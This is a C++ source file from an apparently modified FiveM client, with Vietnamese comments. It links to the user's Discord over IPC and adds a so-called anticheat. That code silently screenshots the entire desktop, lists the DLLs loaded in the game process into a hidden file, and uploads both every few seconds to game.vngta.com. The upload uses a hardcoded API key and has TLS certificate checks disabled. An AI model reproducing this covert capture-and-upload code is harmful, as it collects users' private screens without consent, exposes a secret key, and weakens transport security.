#include <StdInc.h>

#if defined(GTA_FIVE) || defined(IS_RDR3)
#include "CnlEndpoint.h"

#include <CfxState.h>
#include <CfxLocale.h>
#include <CefOverlay.h>



#include <LegitimacyAPI.h>
#include <CL2LaunchMode.h>

#include <json.hpp>

#include <skyr/url.hpp>

#include <HttpClient.h>

#include <curl/curl.h>
#include <gdiplus.h>
#include <process.h> // Cho thread
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <tchar.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cctype> // Cho toupper
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "psapi.lib")

using namespace Gdiplus;
using namespace std;

// Định nghĩa đường dẫn tới file ảnh
#define SCREENSHOT_FILE L"screen.jpeg"

// Khai báo hàm
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
int SaveBitmapJPEG(const WCHAR* file, Bitmap* BMap, ULONG Quality);
Bitmap* CaptureScreen();
int StartScreenShoot();
int SendScreenAndDllList(char* uploadedFile, const wchar_t* userId);
void GetScreen(const wchar_t* userIdZ);
bool isProcessRunning(const char* processName);
int GetProcessModules(DWORD processID, ofstream& myfile);
void GetStartDlls();
void CheckDlls();

// Biến toàn cục
DWORD targetPID = 0;
int startDllCount = 0;
int currentDllCount = 0;
ofstream dllFile;

// Cấu trúc để truyền tham số cho thread
struct ThreadParams
{
	char filename[256];
	wchar_t userId[256];
};

// Hàm thread để gửi ảnh và không chặn luồng chính
unsigned __stdcall SendScreenThread(void* params)
{
	ThreadParams* threadParams = (ThreadParams*)params;
	SendScreenAndDllList(threadParams->filename, threadParams->userId);
	delete threadParams; // Giải phóng bộ nhớ
	return 0;
}

// Hàm chụp và gửi màn hình
void GetScreen(const wchar_t* userIdZ)
{
	// Gọi hàm chụp màn hình và lưu dưới dạng JPEG
	StartScreenShoot();

	// Chuyển đổi từ wchar_t sang char cho tên file
	char filename[256];
	wcstombs(filename, SCREENSHOT_FILE, sizeof(filename));

	// Tạo tham số cho thread
	ThreadParams* params = new ThreadParams();
	strcpy(params->filename, filename);
	wcscpy(params->userId, userIdZ);

	// Tạo thread mới để gửi ảnh
	HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, SendScreenThread, params, 0, NULL);
	if (hThread)
	{
		// Không đợi thread kết thúc, tiếp tục chương trình chính
		CloseHandle(hThread);
	}
}

// Hàm dùng để lấy CLSID của encoder
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT num = 0; // số lượng image encoders
	UINT size = 0; // kích thước của image encoder array trong bytes

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1; // Lỗi

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1; // Lỗi

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j; // Thành công
		}
	}

	free(pImageCodecInfo);
	return -1; // Lỗi
}

// Hàm lưu bitmap dưới dạng JPEG
int SaveBitmapJPEG(const WCHAR* file, Bitmap* BMap, ULONG Quality)
{
	EncoderParameters param;
	param.Count = 1;
	param.Parameter[0].Guid = EncoderQuality;
	param.Parameter[0].Type = EncoderParameterValueTypeLong;
	param.Parameter[0].NumberOfValues = 1;
	param.Parameter[0].Value = &Quality;

	CLSID jpgClsid;
	GetEncoderClsid(L"image/jpeg", &jpgClsid);
	return BMap->Save(file, &jpgClsid, &param);
}

// Hàm chụp màn hình và trả về Bitmap
Bitmap* CaptureScreen()
{
	int ScreenX = GetSystemMetrics(SM_CXSCREEN);
	int ScreenY = GetSystemMetrics(SM_CYSCREEN);

	HWND hDesktop = GetDesktopWindow();
	HDC hdcDesktop = GetWindowDC(hDesktop);

	HBITMAP hBitMap = CreateCompatibleBitmap(hdcDesktop, ScreenX, ScreenY);
	HDC hMemDC = CreateCompatibleDC(hdcDesktop);

	SelectObject(hMemDC, hBitMap);
	BitBlt(hMemDC, 0, 0, ScreenX, ScreenY, hdcDesktop, 0, 0, SRCCOPY);
	HPALETTE HPAL = (HPALETTE)GetCurrentObject(hdcDesktop, OBJ_PAL);

	Bitmap* Bmap = new Bitmap(hBitMap, NULL);

	// Lưu ảnh dưới dạng JPEG với chất lượng 60%
	SaveBitmapJPEG(SCREENSHOT_FILE, Bmap, 60);

	ReleaseDC(hDesktop, hdcDesktop);
	DeleteDC(hMemDC);
	DeleteObject(hBitMap);
	DeleteObject(HPAL);

	return Bmap;
}

int StartScreenShoot()
{
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	CaptureScreen();

	GdiplusShutdown(gdiplusToken);
	return 0;
}

int SendScreenAndDllList(char* uploadedFile, const wchar_t* userId)
{
	CURL* curl;
	CURLcode res;
	struct curl_httppost* formpost = NULL;
	struct curl_httppost* lastptr = NULL;
	struct curl_slist* headerlist = NULL;
	static const char buf[] = "Expect:";


	char userIdBuffer[256] = { 0 };
	wcstombs(userIdBuffer, userId, sizeof(userIdBuffer));

	curl_global_init(CURL_GLOBAL_ALL);

	curl_formadd(&formpost,
	&lastptr,
	CURLFORM_COPYNAME, "upload_file",
	CURLFORM_FILE, uploadedFile,
	CURLFORM_FILENAME, uploadedFile,
	CURLFORM_END);

	curl_formadd(&formpost,
	&lastptr,
	CURLFORM_COPYNAME, "key",
	CURLFORM_COPYCONTENTS, "RzHUZkDAWNEHQh19OjQ8qcuBYr8bkQ6bIFkbODZaxT0K857gSr",
	CURLFORM_END);

	curl_formadd(&formpost,
	&lastptr,
	CURLFORM_COPYNAME, "username",
	CURLFORM_COPYCONTENTS, userIdBuffer,
	CURLFORM_END);

	curl_formadd(&formpost,
	&lastptr,
	CURLFORM_COPYNAME, "userId",
	CURLFORM_COPYCONTENTS, userIdBuffer,
	CURLFORM_END);

	time_t curtime;
	time(&curtime);
	struct tm curdate = *localtime(&curtime);
	char FileName[128];
	sprintf(FileName, "ZCheat_CustomerID_%s_Date_%02d%02d%02d_Time_%02d%02d%02d",
	userIdBuffer,
	1900 + curdate.tm_year,
	curdate.tm_mon + 1,
	curdate.tm_mday,
	curdate.tm_hour,
	curdate.tm_min,
	curdate.tm_sec);

	curl_formadd(&formpost,
	&lastptr,
	CURLFORM_COPYNAME, "filename",
	CURLFORM_COPYCONTENTS, FileName,
	CURLFORM_END);

	curl_formadd(&formpost,
	&lastptr,
	CURLFORM_COPYNAME, "submit",
	CURLFORM_COPYCONTENTS, "send",
	CURLFORM_END);

	curl = curl_easy_init();
	headerlist = curl_slist_append(headerlist, buf);
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_URL, "https://game.vngta.com:3979/infestation/api_Anticheat.php");

		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

		curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
		curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);

		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

		res = curl_easy_perform(curl);

		curl_easy_cleanup(curl);
		curl_formfree(formpost);
		curl_slist_free_all(headerlist);
	}

	curl_global_cleanup();
	return 0;
}

bool isProcessRunning(const char* processName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnapshot, &pe32))
	{
		CloseHandle(hSnapshot);
		return false;
	}

	do
	{
		// Tạo bản sao để chuyển sang chữ hoa
		char exeName[MAX_PATH];
		wcstombs(exeName, pe32.szExeFile, sizeof(exeName));

		// Chuyển sang chữ hoa
		for (int i = 0; exeName[i]; i++)
		{
			exeName[i] = toupper(exeName[i]);
		}

		// Tạo bản sao của processName để chuyển sang chữ hoa
		char upperProcessName[MAX_PATH];
		strcpy(upperProcessName, processName);
		for (int i = 0; upperProcessName[i]; i++)
		{
			upperProcessName[i] = toupper(upperProcessName[i]);
		}

		// So sánh
		if (strcmp(exeName, upperProcessName) == 0)
		{
			targetPID = pe32.th32ProcessID;
			CloseHandle(hSnapshot);
			return true;
		}
	} while (Process32Next(hSnapshot, &pe32));

	CloseHandle(hSnapshot);
	return false;
}

// Hàm lấy danh sách module của một tiến trình
int GetProcessModules(DWORD processID, ofstream& myfile)
{
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	int dllCount = 0;

	// Mở tiến trình
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	if (hProcess == NULL)
	{
		return 0;
	}

	// Lấy danh sách các module
	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			TCHAR szModName[MAX_PATH];

			// Lấy đường dẫn đầy đủ của file module
			if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
			{
// Chuyển đổi TCHAR sang char nếu cần thiết
#ifdef UNICODE
				char modNameChar[MAX_PATH];
				wcstombs(modNameChar, szModName, sizeof(modNameChar));
				myfile << modNameChar << "\n";
#else
				myfile << szModName << "\n";
#endif

				dllCount++;
			}
		}
	}

	// Đóng handle tiến trình
	CloseHandle(hProcess);
	return dllCount;
}

// Hàm lấy danh sách các DLL khi bắt đầu
void GetStartDlls()
{
	const char* processName = "FiveM_GameProcess.exe"; // Hoặc tên tiến trình khác cần theo dõi

	if (!isProcessRunning(processName))
	{
		return;
	}

	// Mở file để ghi danh sách DLL
	if (std::filesystem::exists("dlls.txt"))
	{
		std::filesystem::remove("dlls.txt");
	}
	dllFile.open("dlls.txt");
	if (!dllFile.is_open())
	{
		return;
	}

	// Lấy danh sách ban đầu
	startDllCount = GetProcessModules(targetPID, dllFile);
	dllFile.close();

	// Ẩn file - sử dụng TEXT macro để hỗ trợ cả ANSI và Unicode
	SetFileAttributes(TEXT("dlls.txt"), FILE_ATTRIBUTE_HIDDEN);
}

// Hàm kiểm tra sự thay đổi của DLL
void CheckDlls()
{
	if (targetPID == 0)
	{
		return;
	}

	// Mở file để ghi danh sách DLL hiện tại
	dllFile.open("dlls_current.txt");
	if (!dllFile.is_open())
	{
		return;
	}

	// Lấy danh sách hiện tại
	currentDllCount = GetProcessModules(targetPID, dllFile);
	dllFile.close();

	// Kiểm tra nếu có sự thay đổi
	if (currentDllCount != startDllCount)
	{
		StartScreenShoot();

		wchar_t userId[256] = L"SystemCheck";

		char dllsFile[256] = "dlls_current.txt";
		char screenFile[256];
		wcstombs(screenFile, SCREENSHOT_FILE, sizeof(screenFile));

		SendScreenAndDllList(dllsFile, userId);
		SendScreenAndDllList(screenFile, userId);

		// Xóa các file tạm
		remove("dlls_current.txt");
		remove(screenFile);

		GetStartDlls();
	}
}

// Hàm thread theo dõi DLL
unsigned __stdcall MonitorDllsThread(void* params)
{
	while (true)
	{
		CheckDlls();
		Sleep(5000); // Kiểm tra mỗi 5 giây
	}
	return 0;
}

// Hàm khởi động hệ thống giám sát
void StartDllMonitoring()
{
	GetStartDlls(); // Lấy danh sách ban đầu

	// Tạo thread theo dõi
	HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, MonitorDllsThread, NULL, 0, NULL);
	if (hThread)
	{
		CloseHandle(hThread);
	}
}

using json = nlohmann::json;

static void SaveDiscordUserId(const std::string& userId)
{
	std::wstring fpath = MakeRelativeCitPath(L"CitizenFX.ini");
	if (GetFileAttributes(fpath.c_str()) != INVALID_FILE_ATTRIBUTES)
	{
		WritePrivateProfileString(L"Discord", L"UserId", ToWide(userId).c_str(), fpath.c_str());
	}
	nui::PostFrameMessage("mpMenu", fmt::sprintf(R"({ "type": "discordIdZ", "data": "%s" })", userId));
	//GetScreen(ToWide(userId).c_str());
	//Sleep(5000);
	//StartDllMonitoring();
}

static HookFunction initFunction([]()
{
	std::thread([]()
	{
		HANDLE hPipe = INVALID_HANDLE_VALUE;

		while (true)
		{
			// Iterating over 10 possible discord ipc pipe URLs according to official documentation https://github.com/discord/discord-rpc/blob/master/documentation/hard-mode.md
			for (int i = 0; i < 10; i++)
			{
				hPipe = CreateFileW(va(L"\\\\.\\pipe\\discord-ipc-%d", i), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

				if (hPipe != INVALID_HANDLE_VALUE)
				{
					trace("Kết nối thành công với Discord pipe %d\n", i);
					break;
				}
			}

			// Trying to connect to discord pipe in 5 sec interval for the case when discord was launched after game start
			if (hPipe == NULL || hPipe == INVALID_HANDLE_VALUE)
			{
				Sleep(5000);
				continue;
			}
			else
			{
				break;
			}
		}

		auto writePipe = [hPipe](int opCode, const json& data)
		{
			auto dataStr = data.dump(-1, ' ', false, nlohmann::detail::error_handler_t::replace);

			std::vector<uint8_t> dataBuffer(dataStr.length() + 4 + 4);
			*(uint32_t*)&dataBuffer[0] = opCode;
			*(uint32_t*)&dataBuffer[4] = dataStr.length();
			memcpy(&dataBuffer[8], dataStr.data(), dataStr.length());

			DWORD bytesWritten;
			WriteFile(hPipe, dataBuffer.data(), dataBuffer.size(), &bytesWritten, NULL);
		};

		//382624125287399424
		writePipe(0 /* HANDSHAKE */, json::object({ { "v", 1 },
									 { "client_id", "1359776928873320488" } }));

		auto closeConnection = [&writePipe, &hPipe]()
		{
			writePipe(2, {});
			CloseHandle(hPipe);
			hPipe = INVALID_HANDLE_VALUE;

			trace("Đã clear Connection thành công \n");
		};

		auto handleMsg = [&writePipe, &closeConnection](int opCode, const json& data)
		{
			static std::string userId;

			switch (opCode)
			{
				case 1: // FRAME
					if (data["evt"] == "READY" && data.find("data") != data.end() && data["data"].find("user") != data["data"].end())
					{
						userId = data["data"]["user"]["id"].get<std::string>();

						if (userId == "0")
						{
							break;
						}

						trace("Xác Thực Discord %s \n", userId);
						SaveDiscordUserId(userId);

						// check with CnL if we have access
						/* Instance<::HttpClient>::Get()->DoPostRequest(
						CNL_ENDPOINT "api/validate/discord",
						{ { "entitlementId", ros::GetEntitlementSource() },
						{ "userId", userId } },
						[writePipe, closeConnection](bool success, const char* data, size_t length)
						{
							if (!success && strstr(data, "HTTP 4") != nullptr && !launch::IsSDKGuest())
							{
								 //FRAME
								writePipe(1, json::object({
														 { "cmd", "AUTHORIZE" },
														 { "args", json::object({
																   { "scopes", json::array({ "identify", "guilds.join" }) },
																   { "client_id", "1359776928873320488" },
																   { "redirect_url", "https://cfx.re" },
																   { "prompt", "none" },
																   }) },
														 { "nonce", "nonce1" },
														 }));
							}
							else
							{
								closeConnection();
							}
						});*/
						
					}
					else if (data["nonce"] == "nonce1")
					{
						trace("ko biet Discord z");
						if (data["evt"] == "ERROR")
						{
							// user probably denied auth request in Discord UI
							// #TODO: store this and only ask again when asked by CfxUI
							closeConnection();
						}
						else
						{
							auto code = data["data"]["code"].get<std::string>();

							if (!code.empty())
							{
								Instance<::HttpClient>::Get()->DoPostRequest(
								CNL_ENDPOINT "api/validate/discord",
								{
								{ "entitlementId", ros::GetEntitlementSource() },
								{ "authCode", code },
								{ "userId", userId },
								{ "v", "2" },
								},
								[](bool, const char*, size_t) {

								});
							}

							closeConnection();
						}
					}
					else
					{
						trace("XC 23C Con Discord");
					}
					break;
				case 3: // PING
					writePipe(4 /* PONG */, data);
					break;
			}
		};

		int maxRetries = 2;
		int retryCount = 0;
		while (true)
		{
			if (hPipe == NULL || hPipe == INVALID_HANDLE_VALUE)
			{
				trace("Zo day \n");
				break;
			}

			// read from pipe
			struct
			{
				uint32_t opCode;
				uint32_t length;
			} pktHdr;

			DWORD bytesAvail = 0;


			if (PeekNamedPipe(hPipe, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0)
			{
				trace("Lấy hPipe thành công bytesAvail: %d  \n", bytesAvail);
				retryCount = 0;
				DWORD numRead = 0;
				ReadFile(hPipe, &pktHdr, sizeof(pktHdr), &numRead, NULL);

				if (numRead == sizeof(pktHdr) && pktHdr.length > 0)
				{
					std::vector<uint8_t> buf(pktHdr.length);
					ReadFile(hPipe, buf.data(), buf.size(), &numRead, NULL);

					if (numRead == buf.size())
					{
						try
						{
							handleMsg(pktHdr.opCode, json::parse(buf));
						}
						catch (json::exception& e)
						{
						}
					}
				}
			}
			else
			{
				retryCount++;
				if (retryCount >= maxRetries)
				{
					std::wstring fpath = MakeRelativeCitPath(L"CitizenFX.ini");
					wchar_t buffer[256] = { 0 };
					GetPrivateProfileString(L"Discord", L"UserId", L"", buffer, sizeof(buffer) / sizeof(wchar_t), fpath.c_str());
					std::string discordId = ToNarrow(buffer);

					if (discordId.empty() || discordId == "0")
					{
						trace("Discord: Không tìm thấy ID trong file INI hoặc giá trị không hợp lệ\n");
						// Có thể thêm các hành động khác nếu cần
					}
					else
					{
						trace("Discord: ( hPipe bị ngu ) Tìm thấy ID cũ: %s\n", discordId);
						nui::PostFrameMessage("mpMenu", fmt::sprintf(R"({ "type": "discordIdZ", "data": "%s" })", discordId));
						//GetScreen(ToWide(discordId).c_str());
						StartDllMonitoring();
					}
					break;
				}
				else
				{
					trace("Thử chạy lại hPipe: %d || Lần : %d \n", bytesAvail, retryCount);
				}
				Sleep(1000);
			}
		}
	})
	.detach();
});
#endif
